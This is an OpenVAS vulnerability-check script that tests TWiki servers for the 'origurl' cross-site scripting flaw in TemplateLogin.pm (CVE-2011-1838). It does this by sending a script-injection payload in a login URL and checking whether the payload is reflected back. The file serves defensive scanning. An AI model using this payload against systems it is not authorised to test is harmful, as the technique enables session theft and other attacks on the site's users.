###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_twiki_multiple_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# TWiki 'TemplateLogin.pm' Multiple XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow attackers to inject arbitrary web script
  or HTML. This may allow the attacker to steal cookie-based authentication
  credentials and to launch other attacks.
  Impact Level: Application";
tag_affected = "TWiki version prior to 5.0.2";
tag_insight = "Multiple flaws are due to an input validation error in lib/TWiki
  /LoginManager/TemplateLogin.pm, when handling 'origurl' parameter to a
  view or login script.";
tag_solution = "Apply the patch or upgrade to TWiki 5.0.2 or later,
  http://twiki.org/cgi-bin/view/Codev/DownloadTWiki";
tag_summary = "The host is running TWiki and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(902434);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2011-1838");
  script_bugtraq_id(47899);
  script_name("TWiki 'TemplateLogin.pm' Multiple XSS Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44594");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1025542");
  script_xref(name : "URL" , value : "http://www.mavitunasecurity.com/netsparker-advisories/");
  script_xref(name : "URL" , value : "http://www.mavitunasecurity.com/XSS-vulnerability-in-Twiki/");
  script_xref(name : "URL" , value : "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2011-1838");

  script_description(desc);
  script_copyright("Copyright (C) 2011 SecPod");
  script_summary("Check for XSS vulnerability in TWiki");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Check for default port
twikiPort = get_http_port(default:80);
if(!twikiPort){
  twikiPort = 80;
}

## Check port state
if(!get_port_state(twikiPort)){
  exit(0);
}

## Check for each path
foreach dir (make_list("/twiki", "/", cgi_dirs()))
{
  sndReq = http_get(item:dir + "/bin/twiki/view/Main/WebHome", port:twikiPort);
  rcvRes = http_send_recv(port:twikiPort, data:sndReq);

  ## Application confirmation
  if("Powered by TWiki" >< rcvRes )
  {
    ## Construct attack Request
    req = http_get(item:dir + '/bin/twiki/login/Main/WebHome?"1=;origurl=1""' +
                     '--></style></script><script>alert("XSS-TEST")</script>',
                     port:twikiPort);
    res = http_send_recv(port:twikiPort, data:req);

    ## Confirm the exploit
    if('-></style></script><script>alert("XSS-TEST")</script>' >< res)
    {
      security_warning(twikiPort);
      exit(0);
    }
  }
}
